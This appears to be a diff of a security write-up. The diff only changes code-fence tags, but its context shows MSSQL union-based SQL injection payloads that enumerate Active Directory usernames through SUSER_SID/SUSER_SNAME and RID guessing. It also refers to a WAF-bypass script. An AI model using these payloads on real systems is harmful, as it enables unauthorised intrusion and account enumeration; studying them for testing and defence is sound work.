@@ -18,7 +18,7 @@ The SID/RID consists of several components shown in the diagram:
 
 To find out the SID in a specific domain it is enough to execute the DEFAULT_DOMAIN () MSSQL query, and than using the resulting identifier mask, you can enumerate usernames. Given this access model there is an interesting opportunity for an attacker who found an injection in the MSSQL database.
 
-```
+```markdown
 123' union select 1,2,3,4, DEFAULT_DOMAIN() as mydomain -- 1
 ```
 
@@ -26,7 +26,7 @@ To find out the SID in a specific domain it is enough to execute the DEFAULT_DOM
 
 Using the SUSER_SID and SUSER_SNAME queries, it is possible to enumerate usernames in the domain:
 
-```
+```markdown
 123' union select 1,2,3,4,(select (select stuff(upper(sys.fn_varbintohexstr((SELECT SUSER_SID('YOURDOMAIN\Domain Admins')))), 1, 2, ''))) -- 1
 123' union select 1,2,3,4,SUSER_SNAME(0x0105000000000005150000001C00D1BCD181F1492BDFC236F4010000) -- 1
 ```
@@ -37,7 +37,7 @@ Using the SUSER_SID and SUSER_SNAME queries, it is possible to enumerate usernam
 
 Knowing the structure of the SID and the process of generating RID, you can select 8 bytes related to RID and get a list of usernames in the AD. I wrote a small script to help you do this. It contains WAF bypass elements associated with the waiting time. It also converts each payload character to Unicode, which indicates a non-standard injection:
 
-```
+```markdown
 #!/usr/bin/python3
 
 import requests
@@ -97,7 +97,7 @@ The result will please you =)
 
 To get a positive enumeration result, start with a sequential enumeration using these queries:
 
-```
+```markdown
 123' union select 1,2,3,4,5 -- 1
 123' union select 1,2,3,4,@@version -- 1
 123' union select 1,2,3,4, DEFAULT_DOMAIN() as mydomain -- 1
@@ -106,7 +106,7 @@ To get a positive enumeration result, start with a sequential enumeration using 
 
 For detailed information about the RID pool, you can use the following command:
 
-```
+```markdown
 dcdiag / test: ridmanager / v
 ```
 
